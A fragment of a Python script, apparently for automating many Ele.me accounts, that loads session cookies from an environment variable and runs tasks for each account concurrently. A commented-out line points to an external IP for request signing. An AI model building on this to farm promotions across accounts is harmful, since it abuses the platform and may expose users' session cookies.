if __name__ == '__main__':
    # 从文件 读取被助力的账号列表
    # elmSignUrl = "http://121.199.66.17:5000/api/getXSign"
    # cookies_list = load_assist_config_from_file("zl_config.txt")
    # if not cookies_list:
    #     printf("未找到任何助力账号")
    #     exit(-1)
    # printf(f"获取到 {len(cookies_list)} 个被助力账号")
    # concurrency_limit = 7
    # printf(f"已开启{concurrency_limit}并发")
    # # 使用 ThreadPoolExecutor 并发处理
    # with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency_limit) as executor:
    #     futures = [executor.submit(main, _ + 1, ck) for _, ck in enumerate(cookies_list)]
    #     for future in concurrent.futures.as_completed(futures):
    #         future.result()  # 等待每个线程完成并处理异常
    elmSignUrl = os.environ.get('elmSignUrl')
    cookies = os.environ.get('elmck')
    cookies_list = cookies.split("&")
    printf(f"获取到{len(cookies_list)}个账号")
    concurrency_limit = 5
    printf(f"已开启{concurrency_limit}并发")
    # 使用 ThreadPoolExecutor 并发处理
    with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency_limit) as executor:
        futures = [executor.submit(main, _ + 1, ck) for _, ck in enumerate(cookies_list)]
        for future in concurrent.futures.as_completed(futures):
            future.result()  # 等待每个线程完成并处理异常

    # execute_all_tasks(cookie)
    # main(cookie)
    # prizeNumIds = lyb.sign_info()
    # date_time = datetime.now().strftime("%Y%m%d")
    # for prizeNumId in prizeNumIds:
    #     printf(prizeNumId)
    #     lyb.sign_reward(prizeNumId, date_time)
    #     time.sleep(10)
